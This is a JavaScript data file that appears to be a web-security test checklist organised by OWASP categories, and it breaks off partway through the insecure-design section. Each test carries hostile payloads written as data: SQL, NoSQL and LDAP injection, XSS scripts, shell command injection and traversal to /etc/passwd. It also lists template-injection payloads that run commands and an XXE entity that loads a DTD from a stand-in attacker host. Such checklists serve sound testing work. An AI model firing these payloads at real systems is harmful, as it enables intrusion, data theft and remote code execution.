// FINAL, CORRECTED, AND DE-DUPLICATED TEST DATA

const securityTestData = {
  "OWASP A01 - Broken Access Control": [
    {
      "id": "BAC-001",
      "name": "Insecure Direct Object References (IDOR) - Numeric IDs",
      "page": "Any page with ID parameters (profile pages, document access, order details)",
      "description": "Test if attackers can access unauthorized data by modifying numeric ID parameters in URLs, forms, or API requests.",
      "howToTest": "Identify pages with numeric ID parameters. Try incrementing/decrementing values, using large numbers, negative numbers, and zero values. Test with another user account to verify unauthorized access.",
      "payloads": ["../1", "../2", "../99999", "../0", "../-1", "%2e%2e%2f1", "1%00", "1%20", "1%2500", "../../etc/passwd%00", "1.php", "1.jsp", "1.asp", "1;cat%20/etc/passwd"],
      "tools": "Burp Suite (Autorize extension), OWASP ZAP, Custom Python scripts",
      "critical": true
    },
    {
      "id": "BAC-002", 
      "name": "IDOR - GUID/UUID Manipulation",
      "page": "Pages using GUID/UUID identifiers",
      "description": "Test if GUID-based object references can be enumerated or predicted to access unauthorized resources.",
      "howToTest": "Collect multiple GUIDs from different contexts. Analyze patterns, try common GUID formats, use GUID generators, and test with null/empty values.",
      "payloads": ["00000000-0000-0000-0000-000000000000", "11111111-1111-1111-1111-111111111111", "ffffffff-ffff-ffff-ffff-ffffffffffff", "../admin", "../administrator", "../root", "null", "undefined", "%00", ""],
      "tools": "Burp Suite, UUID generators, Pattern analysis tools",
      "critical": true
    },
    {
      "id": "BAC-003",
      "name": "Horizontal Privilege Escalation",
      "page": "User profile pages, account details, personal information sections",
      "description": "Test if users can access data belonging to other users with similar privilege levels.",
      "howToTest": "Create two user accounts with similar roles. Access resources as User A, then modify parameters to access User B's data. Check session tokens, cookies, and hidden form fields.",
      "payloads": ["user=admin", "user=administrator", "user=guest", "userid=1", "userid=0", "account_id=999", "profile_id=../admin", "&user=admin", "?user=admin", "#user=admin"],
      "tools": "Burp Suite (Session handling rules), Multi-user testing framework",
      "critical": true
    },
    {
      "id": "BAC-004",
      "name": "Vertical Privilege Escalation",
      "page": "Administrative panels, configuration pages, user management sections",
      "description": "Test if low-privileged users can gain access to high-privileged functionality.",
      "howToTest": "Map admin functions while logged as admin. Log in as regular user and attempt to access admin URLs directly. Test parameter manipulation to elevate privileges.",
      "payloads": ["role=admin", "role=administrator", "isAdmin=true", "admin=1", "privilege=admin", "access_level=99", "group=administrators", "type=admin", "level=administrator", "permission=all"],
      "tools": "Burp Suite (Autorize extension), Manual testing, Access matrix tools",
      "critical": true
    },
    {
      "id": "BAC-005",
      "name": "Forced Browsing - Predictable URLs",
      "page": "Admin panels, backup files, configuration directories",
      "description": "Test access to unlinked but predictable URLs that may contain sensitive functionality or data.",
      "howToTest": "Use directory enumeration tools and common path wordlists. Test predictable paths like /admin, /config, backup files, and development directories.",
      "payloads": ["/admin", "/admin.php", "/administrator", "/config", "/backup", "/test", "/dev", "/staging", "/uploads", "/.env", "/config.php", "/admin/config.php", "/wp-admin", "/administrator.php", "/login", "/control", "/panel"],
      "tools": "DirBuster, Gobuster, ffuf, Burp Suite (Content Discovery)",
      "critical": false
    },
    {
      "id": "BAC-006",
      "name": "Missing Function Level Access Control - HTTP Methods",
      "page": "API endpoints, CRUD operations",
      "description": "Test if access controls are properly implemented across different HTTP methods.",
      "howToTest": "Identify endpoints that use GET for safe operations. Try accessing them with POST, PUT, DELETE, PATCH methods to bypass access controls.",
      "payloads": ["POST /api/users/delete", "PUT /api/admin/config", "DELETE /api/users/1", "PATCH /api/settings", "OPTIONS /admin", "HEAD /config", "TRACE /admin", "CONNECT admin:80"],
      "tools": "Burp Suite, Postman, curl, HTTP method testing tools",
      "critical": true
    },
    {
      "id": "BAC-007",
      "name": "Parameter Tampering - Hidden Form Fields",
      "page": "Forms with hidden fields, checkout processes, user role assignments",
      "description": "Test if modifying hidden form parameters can bypass access controls or elevate privileges.",
      "howToTest": "Inspect form HTML for hidden fields. Modify values related to user roles, prices, access levels. Submit forms with tampered parameters.",
      "payloads": ["<input type=\"hidden\" name=\"role\" value=\"admin\">", "<input type=\"hidden\" name=\"price\" value=\"0\">", "<input type=\"hidden\" name=\"isAdmin\" value=\"true\">", "<input type=\"hidden\" name=\"access_level\" value=\"administrator\">"],
      "tools": "Browser Developer Tools, Burp Suite, Form manipulation extensions",
      "critical": true
    },
    {
      "id": "BAC-008",
      "name": "URL Manipulation - Path Traversal in Access Control",
      "page": "File access systems, document repositories",
      "description": "Test if URL path manipulation can bypass directory restrictions and access unauthorized files.",
      "howToTest": "Modify file paths in URLs using directory traversal sequences. Test various encoding methods and path manipulation techniques.",
      "payloads": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "....//....//....//etc/passwd", "..;/..;/..;/etc/passwd", "../admin/config.php"],
      "tools": "Burp Suite, Path traversal wordlists, Custom payloads",
      "critical": true
    },
    {
      "id": "BAC-009",
      "name": "Session Token Manipulation",
      "page": "All authenticated pages",
      "description": "Test if session tokens can be manipulated to access other user accounts or gain elevated privileges.",
      "howToTest": "Analyze session token structure. Try modifying JWT claims, cookie values, or session IDs to impersonate other users or elevate privileges.",
      "payloads": ["admin", "administrator", "root", "guest", "test", "demo", "null", "0", "1", "../admin", "../../admin"],
      "tools": "JWT.io, Burp Suite JWT Editor, Session analysis tools",
      "critical": true
    },
    {
      "id": "BAC-010",
      "name": "CORS Misconfiguration Access Control Bypass",
      "page": "API endpoints, AJAX requests",
      "description": "Test if CORS misconfigurations allow unauthorized cross-origin access to sensitive resources.",
      "howToTest": "Send requests with various Origin headers. Check if application reflects arbitrary origins or uses wildcards inappropriately with credentials.",
      "payloads": ["Origin: https://evil.com", "Origin: null", "Origin: https://attacker.evil.com", "Origin: https://sub.legitimate-site.com.evil.com"],
      "tools": "Burp Suite, CORS testing tools, Browser developer console",
      "critical": false
    },
    {
      "id": "BAC-011",
      "name": "JWT Token Manipulation",
      "page": "API endpoints using JWT for authentication",
      "description": "Test if manipulating JWT tokens can bypass access controls or elevate privileges.",
      "howToTest": "Decode JWT tokens and modify claims like role or expiration. Resign if possible and test if the manipulated token grants unauthorized access.",
      "payloads": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "Change alg to none: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "Modify sub claim: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.modified_signature", "Expired token bypass: Change exp claim to future date"],
      "tools": "JWT.io, Burp Suite JWT Editor, jwt_tool",
      "critical": true
    },
    {
      "id": "BAC-012",
      "name": "CORS Misconfiguration with Credentials",
      "page": "Cross-origin API requests",
      "description": "Test if CORS policies improperly allow credentialed requests from unauthorized origins.",
      "howToTest": "Send cross-origin requests with credentials from unauthorized domains. Check if sensitive data is exposed via misconfigured Access-Control-Allow-Origin.",
      "payloads": ["Access-Control-Allow-Origin: *", "Access-Control-Allow-Origin: null", "Access-Control-Allow-Credentials: true with wildcard origin", "Origin: evil.com in request header"],
      "tools": "Burp Suite, CORS testing scripts, Browser console",
      "critical": true
    },
    {
      "id": "BAC-013",
      "name": "Mass Assignment Vulnerability",
      "page": "API endpoints for object creation/update",
      "description": "Test if binding user input to objects allows setting unauthorized properties.",
      "howToTest": "Submit additional parameters in API requests that shouldn't be user-controllable, like isAdmin or role.",
      "payloads": ["{ \"username\": \"test\", \"isAdmin\": true }", "{ \"role\": \"admin\", \"accessLevel\": \"root\" }", "{ \"verified\": true, \"email\": \"attacker@evil.com\" }", "{ \"balance\": 999999 }"],
      "tools": "Postman, Burp Suite, API testing frameworks",
      "critical": true
    },
    {
      "id": "BAC-014",
      "name": "Missing Rate Limiting on Sensitive Endpoints",
      "page": "Login, password reset, API calls",
      "description": "Test if lack of rate limiting allows brute force attacks on access controls.",
      "howToTest": "Send rapid successive requests to protected endpoints and check if the system blocks or slows them down.",
      "payloads": ["Multiple login attempts: username=admin&password=pass1, pass2, etc.", "API flood: 1000+ requests per minute", "Password reset spam"],
      "tools": "Burp Suite Intruder, Custom rate limiting test scripts",
      "critical": false
    },
    {
      "id": "BAC-015",
      "name": "Insecure API Endpoint Exposure",
      "page": "Public-facing APIs",
      "description": "Test if internal or admin APIs are exposed without proper access controls.",
      "howToTest": "Scan for hidden API endpoints and test access without authentication or with low privileges.",
      "payloads": ["/api/internal/users", "/api/admin/config", "/api/v1/debug", "/api/private/data"],
      "tools": "ffuf, Gobuster, API scanners like Postman collections",
      "critical": true
    },
    {
      "id": "BAC-016",
      "name": "Cookie Flag Misconfiguration",
      "page": "Session management via cookies",
      "description": "Test if improper cookie flags allow session hijacking or unauthorized access.",
      "howToTest": "Check if Secure, HttpOnly, and SameSite flags are properly set. Test cookie theft via XSS or MITM.",
      "payloads": ["Cookie without Secure flag over HTTP", "Cookie without HttpOnly allowing XSS access", "SameSite=None without Secure"],
      "tools": "Browser Developer Tools, Burp Suite cookie analysis",
      "critical": true
    },
    {
      "id": "BAC-017",
      "name": "Business Logic Bypass in Workflows",
      "page": "Multi-step processes like checkout or approvals",
      "description": "Test if skipping or manipulating workflow steps bypasses access controls.",
      "howToTest": "Identify multi-step flows and attempt to jump directly to final steps or reverse engineer state parameters.",
      "payloads": ["Direct access to /confirm without /review", "Modify state=pending to state=approved", "Negative quantity in orders"],
      "tools": "Manual testing, Burp Suite, Workflow analysis",
      "critical": true
    },
    {
      "id": "BAC-018",
      "name": "Improper Authorization in Microservices",
      "page": "Microservices architectures",
      "description": "Test if inter-service communications lack proper authorization checks.",
      "howToTest": "Intercept service-to-service calls and modify to access unauthorized services or data.",
      "payloads": ["Modified service tokens", "Bypassed API gateway checks", "Direct service endpoint access"],
      "tools": "Service mesh tools, Burp Suite, API testing suites",
      "critical": true
    },
    {
      "id": "BAC-019",
      "name": "File Upload Access Control Bypass",
      "page": "File upload functionalities",
      "description": "Test if uploaded files can be accessed without proper authorization.",
      "howToTest": "Upload files and try accessing them with different users or without authentication. Test path manipulation.",
      "payloads": ["/uploads/1/private.doc", "../uploads/admin/file", "null byte injection: file.php%00.jpg"],
      "tools": "Burp Suite, File upload testing tools",
      "critical": true
    },
    {
      "id": "BAC-020",
      "name": "Cache Poisoning via Access Control",
      "page": "Cached pages or resources",
      "description": "Test if cache mechanisms can be poisoned to serve unauthorized content.",
      "howToTest": "Manipulate cache keys or headers to store unauthorized data in cache, then access as different users.",
      "payloads": ["Modified Cache-Control headers", "Vary header manipulation", "Cache key poisoning with user input"],
      "tools": "Burp Suite, Cache testing proxies, Manual cache analysis",
      "critical": false
    }
  ],
 "OWASP A02 - Cryptographic Failures": [
    {
      "id": "CRYPT-001",
      "name": "Sensitive Data Transmitted in Clear Text",
      "page": "Login forms, registration pages, personal information forms",
      "description": "Test if sensitive data like passwords, PII, or financial information is transmitted over HTTP instead of HTTPS.",
      "howToTest": "Monitor network traffic during form submissions. Check if sensitive data is sent over HTTP. Test for mixed content issues on HTTPS sites.",
      "payloads": ["http://site.com/login", "http://site.com/register", "http://api.site.com/users", "ws://site.com/chat"],
      "tools": "Wireshark, Burp Suite, OWASP ZAP, Browser Developer Tools",
      "critical": true
    },
    {
      "id": "CRYPT-002",
      "name": "Weak Cryptographic Algorithms",
      "page": "Password storage, API tokens, encrypted data",
      "description": "Test for the use of weak or deprecated cryptographic algorithms like MD5, SHA1, DES, or weak cipher suites.",
      "howToTest": "Analyze SSL/TLS configuration with tools like SSLyze. Check password hashes for weak algorithms. Look for hardcoded encryption keys.",
      "payloads": ["MD5 hashes", "SHA1 signatures", "DES encryption", "RC4 cipher", "SSLv2/SSLv3 protocols", "1024-bit RSA keys"],
      "tools": "SSLyze, testssl.sh, Nmap SSL scripts, Hash analyzers",
      "critical": true
    },
    {
      "id": "CRYPT-003",
      "name": "Missing or Insufficient Encryption",
      "page": "Database connections, file storage, backup systems",
      "description": "Test if sensitive data is stored or transmitted without proper encryption protection.",
      "howToTest": "Check database configurations, file permissions, backup storage. Look for unencrypted database connections and plain text file storage.",
      "payloads": ["Unencrypted database connections", "Plain text configuration files", "Unencrypted backups", "Clear text logs"],
      "tools": "Database scanners, File system analyzers, Configuration review tools",
      "critical": true
    },
    {
      "id": "CRYPT-004",
      "name": "Hardcoded Cryptographic Keys",
      "page": "Application source code, configuration files",
      "description": "Test for hardcoded encryption keys that can be easily extracted from the application.",
      "howToTest": "Search source code and binaries for known key patterns. Decompile mobile apps or analyze web app source.",
      "payloads": ["secret_key = 'hardcoded_value'", "api_key = '1234567890abcdef'", "encryption_key = 'password123'"],
      "tools": "Strings tool, Binwalk, Code analysis tools like SonarQube",
      "critical": true
    },
    {
      "id": "CRYPT-005",
      "name": "Insufficient Key Length",
      "page": "Encryption implementations, SSL/TLS configurations",
      "description": "Test if cryptographic keys use insufficient bit lengths making them vulnerable to brute force.",
      "howToTest": "Check key sizes in SSL certificates and encryption implementations. Verify against current standards (e.g., minimum 2048-bit RSA).",
      "payloads": ["512-bit RSA keys", "1024-bit Diffie-Hellman groups", "40-bit encryption"],
      "tools": "SSLyze, Key length analyzers, Nmap",
      "critical": true
    },
    {
      "id": "CRYPT-006",
      "name": "Predictable Random Number Generation",
      "page": "Token generation, nonce creation, password reset tokens",
      "description": "Test if random values are predictable due to weak PRNG usage.",
      "howToTest": "Generate multiple tokens and analyze for patterns or predictability. Test seed values if accessible.",
      "payloads": ["Weak seed: time-based tokens", "Predictable UUIDs", "Linear congruential generators"],
      "tools": "Burp Sequencer, Custom statistical analysis scripts",
      "critical": true
    },
    {
      "id": "CRYPT-007",
      "name": "Missing Certificate Validation",
      "page": "API clients, mobile apps connecting to servers",
      "description": "Test if applications properly validate SSL/TLS certificates, preventing MITM attacks.",
      "howToTest": "Use self-signed or invalid certificates in test environments. Check if the application accepts them without errors.",
      "payloads": ["Self-signed certificates", "Expired certificates", "Wrong hostname certificates"],
      "tools": "MITMProxy, Burp Suite, Certificate pinning testers",
      "critical": true
    },
    {
      "id": "CRYPT-008",
      "name": "Weak Password Hashing",
      "page": "Authentication systems, password storage",
      "description": "Test if passwords are stored using weak hashing algorithms without proper salting or iterations.",
      "howToTest": "Extract password hashes if possible and attempt cracking. Check for fast hashing algorithms like MD5 without PBKDF2.",
      "payloads": ["MD5 unsalted hashes", "SHA1 without salt", "LM/NTLM hashes"],
      "tools": "Hashcat, John the Ripper, Hash analyzers",
      "critical": true
    },
    {
      "id": "CRYPT-009",
      "name": "Insecure Randomness in IV/Nonce",
      "page": "Encryption routines using IVs or nonces",
      "description": "Test if initialization vectors or nonces are reused or predictable.",
      "howToTest": "Capture multiple encrypted messages and check for IV reuse. Analyze nonce generation for patterns.",
      "payloads": ["Reused IV in CBC mode", "Predictable nonces in CTR mode", "Zero IV"],
      "tools": "Cryptographic analysis tools, Custom scripts",
      "critical": true
    },
    {
      "id": "CRYPT-010",
      "name": "Padding Oracle Attacks",
      "page": "Systems using padded encryption like PKCS#7",
      "description": "Test for vulnerabilities in padding implementations that leak information.",
      "howToTest": "Modify encrypted data and observe error responses for information leakage.",
      "payloads": ["Modified ciphertext blocks", "Bit-flipping attacks on padding"],
      "tools": "PadBuster, Custom oracle exploit tools",
      "critical": true
    },
    {
      "id": "CRYPT-011",
      "name": "Downgrade Attacks",
      "page": "SSL/TLS negotiations, protocol handshakes",
      "description": "Test if the application can be forced to downgrade to weaker encryption protocols.",
      "howToTest": "Attempt to negotiate weak protocols or cipher suites during handshakes.",
      "payloads": ["Force TLS 1.0", "Negotiate weak ciphers like RC4"],
      "tools": "SSLyze, testssl.sh, Wireshark",
      "critical": true
    },
    {
      "id": "CRYPT-012",
      "name": "Cryptographic Side-Channel Attacks",
      "page": "Encryption implementations",
      "description": "Test for timing or cache-based side-channel vulnerabilities in crypto code.",
      "howToTest": "Measure execution time differences or cache hits for different inputs.",
      "payloads": ["Timing attack payloads", "Cache probe requests"],
      "tools": "Timing measurement tools, Cache analysis frameworks",
      "critical": false
    },
    {
      "id": "CRYPT-013",
      "name": "Insufficient Entropy in Key Generation",
      "page": "Key generation routines",
      "description": "Test if generated keys lack sufficient randomness.",
      "howToTest": "Generate multiple keys and analyze for entropy and uniqueness.",
      "payloads": ["Low-entropy seeds", "Predictable key generation"],
      "tools": "Entropy analysis tools, Statistical tests",
      "critical": true
    },
    {
      "id": "CRYPT-014",
      "name": "Weak Certificate Pinning",
      "page": "Mobile apps, certificate pinning implementations",
      "description": "Test if certificate pinning can be bypassed in mobile applications.",
      "howToTest": "Use Frida or similar tools to hook pinning checks and bypass them.",
      "payloads": ["Bypass hooks", "Custom certificate injections"],
      "tools": "Frida, Objection, Mobile security frameworks",
      "critical": true
    },
    {
      "id": "CRYPT-015",
      "name": "Insecure Key Storage",
      "page": "Mobile apps, configuration files",
      "description": "Test if cryptographic keys are stored insecurely, allowing extraction.",
      "howToTest": "Decompile apps or analyze files for unprotected key storage.",
      "payloads": ["Hardcoded keys in code", "Keys in shared preferences"],
      "tools": "APK decompilers, File analyzers",
      "critical": true
    },
    {
      "id": "CRYPT-016",
      "name": "Missing HSTS Implementation",
      "page": "Web applications",
      "description": "Test if HTTP Strict Transport Security is properly implemented to prevent downgrade attacks.",
      "howToTest": "Check for HSTS headers and proper configuration including subdomains.",
      "payloads": ["Missing Strict-Transport-Security header", "Weak max-age values"],
      "tools": "Browser tools, HSTS checkers",
      "critical": false
    },
    {
      "id": "CRYPT-017",
      "name": "Weak Diffie-Hellman Parameters",
      "page": "TLS configurations using DH",
      "description": "Test for small DH group sizes vulnerable to Logjam attack.",
      "howToTest": "Analyze TLS handshake for DH parameter sizes.",
      "payloads": ["512-bit DH groups", "1024-bit DH groups"],
      "tools": "testssl.sh, SSLyze",
      "critical": true
    },
    {
      "id": "CRYPT-018",
      "name": "Insecure Random Number Usage in Security Contexts",
      "page": "OTP generation, password resets",
      "description": "Test if random numbers used in security features are truly random.",
      "howToTest": "Generate multiple values and check for patterns or predictability.",
      "payloads": ["Time-seeded randoms", "Predictable OTPs"],
      "tools": "Burp Sequencer, Statistical analysis",
      "critical": true
    },
    {
      "id": "CRYPT-019",
      "name": "Missing Perfect Forward Secrecy",
      "page": "TLS configurations",
      "description": "Test if TLS sessions lack PFS, allowing future decryption if private key is compromised.",
      "howToTest": "Check cipher suites for ephemeral key exchange support.",
      "payloads": ["Non-ephemeral cipher suites", "RSA key exchange"],
      "tools": "SSLyze, Nmap",
      "critical": false
    },
    {
      "id": "CRYPT-020",
      "name": "Cryptographic Oracle Attacks",
      "page": "Encryption/decryption endpoints",
      "description": "Test for oracles that leak information about encrypted data.",
      "howToTest": "Submit modified ciphertexts and analyze responses for patterns.",
      "payloads": ["Modified ciphertexts", "Bit-flipped blocks"],
      "tools": "Custom oracle exploit scripts, Padding oracle tools",
      "critical": true
    }
  ],
  "OWASP A03 - Injection": [
   {
      "id": "INJ-001",
      "name": "SQL Injection - Authentication Bypass",
      "page": "Login forms, search functionality, user input fields",
      "description": "Test if SQL injection can be used to bypass authentication mechanisms or extract unauthorized data.",
      "howToTest": "Insert SQL metacharacters into input fields. Test various SQL injection payloads including union-based, boolean-based, and time-based techniques.",
      "payloads": ["' OR '1'='1", "' OR 1=1--", "admin'--", "admin'#", "\"; DROP TABLE users; --"],
      "tools": "SQLMap, Burp Suite, OWASP ZAP",
      "critical": true
    },
    {
      "id": "INJ-002",
      "name": "NoSQL Injection",
      "page": "MongoDB queries, document databases, JSON APIs",
      "description": "Test for injection vulnerabilities in NoSQL databases through parameter manipulation.",
      "howToTest": "Test JSON payloads that modify query logic. Try JavaScript injection in MongoDB contexts.",
      "payloads": ["{\"$gt\":\"\"}", "{\"$ne\":null}", "{\"$where\":\"this.username==this.password\"}", "{\"username\":{\"$regex\":\".*\"}}"],
      "tools": "NoSQLMap, Burp Suite extensions",
      "critical": true
    },
    {
      "id": "INJ-003",
      "name": "Cross-Site Scripting (XSS) – Reflected",
      "page": "Search forms, error messages, URL parameters",
      "description": "Test if user input is reflected in HTTP responses without proper encoding, allowing script execution.",
      "howToTest": "Submit JavaScript payloads in input fields and URL parameters. Check if scripts execute in the browser response.",
      "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"],
      "tools": "Burp Suite, XSStrike",
      "critical": true
    },
    {
      "id": "INJ-004",
      "name": "OS Command Injection",
      "page": "File upload features, system utilities, diagnostic tools",
      "description": "Test if user input is passed to system commands without proper sanitization.",
      "howToTest": "Inject command separators and system commands into input fields.",
      "payloads": ["; ls -la", "&& whoami", "| ping -c 4 127.0.0.1", "`id`"],
      "tools": "Commix, Burp Suite",
      "critical": true
    },
    {
      "id": "INJ-005",
      "name": "LDAP Injection",
      "page": "Authentication systems, directory searches",
      "description": "Test for LDAP injection vulnerabilities that alter LDAP queries.",
      "howToTest": "Inject LDAP metacharacters into authentication fields. Observe authentication or search anomalies.",
      "payloads": ["*)(uid=*))(|(uid=*", "*)(|(objectClass=*))", "admin*)((|userPassword=*)"],
      "tools": "Manual testing, Burp Suite",
      "critical": true
    },

    /*----------- NEW TESTS (6 → 20) -----------*/
    {
      "id": "INJ-006",
      "name": "Cross-Site Scripting (XSS) – Stored",
      "page": "Comment boxes, profile bios, message boards",
      "description": "Determine if persistent XSS lets attackers store malicious scripts in the database that run for every visitor.",
      "howToTest": "Submit XSS payloads in stored fields, then view the affected page with another account/browser.",
      "payloads": ["<script>alert('stored')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=confirm(1)>"],
      "tools": "Burp Suite, BeEF",
      "critical": true
    },
    {
      "id": "INJ-007",
      "name": "Cross-Site Scripting (XSS) – DOM-Based",
      "page": "Single-page apps, client-side JavaScript rendering",
      "description": "Test if client-side scripts write unsanitized user input to the DOM, enabling script execution.",
      "howToTest": "Inject JavaScript into URL fragments or DOM-manipulated parameters and observe script execution in the browser.",
      "payloads": ["#\"><img src=x onerror=alert(1)>", "javascript:alert(document.domain)", "\" onmouseover=\"alert(1)"],
      "tools": "Browser DevTools, DOM Invader (Burp)",
      "critical": true
    },
    {
      "id": "INJ-008",
      "name": "XPath Injection",
      "page": "XML data stores, search filters assembling XPath queries",
      "description": "Test if user input can manipulate XPath queries to access unauthorized XML nodes.",
      "howToTest": "Inject XPath operators and functions. Observe changes in returned XML data or error messages.",
      "payloads": ["' or 1=1 or 'a'='b", "\" or count(//user)=0 or \"\"=\"", "admin' ] | //* | //user/*"],
      "tools": "Burp Suite, Custom scripts",
      "critical": false
    },
    {
      "id": "INJ-009",
      "name": "XML External Entity (XXE)",
      "page": "Endpoints parsing XML (SOAP, SAML, XML uploads)",
      "description": "Determine if external entities in XML can read local files or perform SSRF.",
      "howToTest": "Inject a malicious DOCTYPE with external entity definitions; monitor for file disclosure or outbound traffic.",
      "payloads": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "<!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\">%dtd;"],
      "tools": "Burp Suite, XXE-Map",
      "critical": true
    },
    {
      "id": "INJ-010",
      "name": "SMTP / Email Header Injection",
      "page": "Contact forms, password reset emails",
      "description": "Test if CRLF can break email headers and add Bcc/To headers to send spam.",
      "howToTest": "Inject CRLF sequences into email fields. Observe if additional headers are accepted by the SMTP server.",
      "payloads": ["test%0d%0aBcc:attacker@evil.com", "victim@example.com\r\nCc:spam@evil.com", "Subject: Legit\r\n\r\nMalicious body"],
      "tools": "Burp Suite, Netcat",
      "critical": false
    },
    {
      "id": "INJ-011",
      "name": "Server-Side Template Injection (SSTI)",
      "page": "Template engines (Jinja2, Freemarker, Thymeleaf)",
      "description": "Test if unsanitized user input is evaluated by the server-side template engine, leading to RCE.",
      "howToTest": "Inject template expressions and look for evaluation or error leakage.",
      "payloads": ["{{7*7}}", "${7*7}", "{{self.__init__.__globals__.os.popen('id').read()}}", "${T(java.lang.Runtime).getRuntime().exec('whoami')}"],
      "tools": "Tplmap, Burp Suite",
      "critical": true
    },
    {
      "id": "INJ-012",
      "name": "JSON / JavaScript Injection",
      "page": "JSONP endpoints, client-side eval of JSON",
      "description": "Determine if user-controlled JSON is parsed with eval or Function, enabling JS code execution.",
      "howToTest": "Inject closing braces and JavaScript payloads into JSON fields used in client-side eval.",
      "payloads": ["{\"name\":\"test\"};alert(1);//", "]});alert(document.domain);//", "');alert(1);//"],
      "tools": "Burp Suite, Browser DevTools",
      "critical": true
    },
    {
      "id": "INJ-013",
      "name": "Expression Language Injection (EL/OGNL)",
      "page": "Java server frameworks (Struts, Spring, JSP EL)",
      "description": "Test if user input is evaluated by server-side expression language processors.",
      "howToTest": "Inject OGNL/SpEL payloads and observe execution or error messages.",
      "payloads": ["${7*7}", "%{#context['x']=@java.lang.Runtime@getRuntime().exec('id')}", "${T(java.lang.System).getenv()}"],
      "tools": "Burp Suite, Custom EL payload lists",
      "critical": true
    },
    {
      "id": "INJ-014",
      "name": "GraphQL Injection",
      "page": "GraphQL API endpoints",
      "description": "Test if unsanitized GraphQL queries or variables allow injection of resolvers or introspection abuse.",
      "howToTest": "Manipulate query strings and variables to access unauthorized fields or perform DoS via deeply nested queries.",
      "payloads": ["query{__schema{types{name}}}", "query{user(id:\"1 or 1=1\"){id name}}", "{user(id:\"1\"){id name friends{friends{friends{id}}}}}"],
      "tools": "InQL, GraphQL-Voyager, Burp Suite",
      "critical": true
    },
    {
      "id": "INJ-015",
      "name": "HTTP Response Splitting (CRLF Injection)",
      "page": "Endpoints reflecting headers (Location, Set-Cookie)",
      "description": "Inject CRLF to split HTTP responses, potentially leading to header injection or cache poisoning.",
      "howToTest": "Insert %0d%0a (or \\r\\n) sequences in parameters that are copied into response headers.",
      "payloads": ["%0d%0aSet-Cookie:attack=1", "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK"],
      "tools": "Burp Suite, Manual testing",
      "critical": false
    },
    {
      "id": "INJ-016",
      "name": "Host Header Injection",
      "page": "Applications relying on Host header for routing or password resets",
      "description": "Manipulate Host header to poison password reset links or bypass access controls.",
      "howToTest": "Send requests with arbitrary Host headers and observe reflected links or internal redirects.",
      "payloads": ["Host: evil.com", "Host: attacker.com", "X-Forwarded-Host: evil.com"],
      "tools": "Burp Suite, curl",
      "critical": true
    },
    {
      "id": "INJ-017",
      "name": "Server-Side Includes (SSI) Injection",
      "page": "Pages that process .shtml or web-server-side include directives",
      "description": "Inject SSI directives to execute server commands or read files.",
      "howToTest": "Upload or inject payloads containing SSI directives and access the processed page.",
      "payloads": ["<!--#exec cmd=\"ls\"-->", "<!--#include virtual=\"/etc/passwd\"-->", "<!--#echo var=\"DOCUMENT_ROOT\"-->"],
      "tools": "Burp Suite, Manual SSI crafting",
      "critical": false
    },
    {
      "id": "INJ-018",
      "name": "Blind OS Command Injection (Time-based)",
      "page": "Parameters executed in shell without output",
      "description": "Detect command injection where output is suppressed by measuring response delays.",
      "howToTest": "Inject commands that introduce a time delay and measure server response time.",
      "payloads": ["; sleep 5 ;", "&& ping -c 5 127.0.0.1 &&", "| timeout 5 ping 0 &"],
      "tools": "Burp Collaborator, curl with timing",
      "critical": true
    },
    {
      "id": "INJ-019",
      "name": "Path Injection / File Inclusion (LFI/RFI)",
      "page": "File download/view endpoints, template includes",
      "description": "Manipulate file path parameters to include or read arbitrary files.",
      "howToTest": "Inject ../ sequences and test NULL-byte, encoding, and wrapper bypasses.",
      "payloads": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
      "tools": "Burp Suite, DirBuster",
      "critical": true
    },
    {
      "id": "INJ-020",
      "name": "ORM / HQL Injection",
      "page": "Applications using Hibernate, JPQL, or other ORMs",
      "description": "Test if query parameters are concatenated into ORM queries allowing injection.",
      "howToTest": "Inject query modifiers or logical operators into parameters used in HQL/JPQL.",
      "payloads": ["' or 1=1", "order by 1--", "select e from User e where e.id=1 or 1=1"],
      "tools": "Burp Suite, Custom scripts",
      "critical": true
    }
  ],
  "OWASP A04 - Insecure Design": [
   {
      "id": "DESIGN-001",
      "name": "Insufficient Access Control Granularity",
      "page": "User management systems, permission assignment interfaces",
      "description": "Test if access controls lack fine-grained permissions, allowing overly broad access.",
      "howToTest": "Review permission models for role-based vs attribute-based controls. Test if users can perform actions beyond their intended scope.",
      "payloads": ["Assign broad roles: admin instead of read-only", "Manipulate permission flags: access_level=full"],
      "tools": "Manual review, Access control matrix testing",
      "critical": true
    },
    {
      "id": "DESIGN-002",
      "name": "Missing Multi-Factor Authentication (MFA)",
      "page": "Login systems, sensitive action confirmations",
      "description": "Test if critical operations lack MFA requirements, allowing single-factor compromise.",
      "howToTest": "Attempt sensitive actions without MFA prompts. Check configuration for MFA enforcement.",
      "payloads": ["Bypass attempts: fake MFA codes", "Session continuation without re-auth"],
      "tools": "Burp Suite, Manual testing",
      "critical": true
    },
    {
      "id": "DESIGN-003",
      "name": "Insecure Default Configurations",
      "page": "Installation wizards, default setups",
      "description": "Test if default installations expose sensitive features or use weak defaults.",
      "howToTest": "Install with defaults and check for exposed admin panels or default credentials.",
      "payloads": ["Default admin:admin", "Exposed debug endpoints"],
      "tools": "Default scanners, Configuration analyzers",
      "critical": true
    },
    {
      "id": "DESIGN-004",
      "name": "Lack of Input Validation Normalization",
      "page": "All input forms, API endpoints",
      "description": "Test if inputs aren't properly normalized, leading to canonicalization issues.",
      "howToTest": "Submit various encoded inputs and check if they bypass validation.",
      "payloads": ["%2e%2e%2f", "../", "&#x2e;&#x2e;/", "....//"],
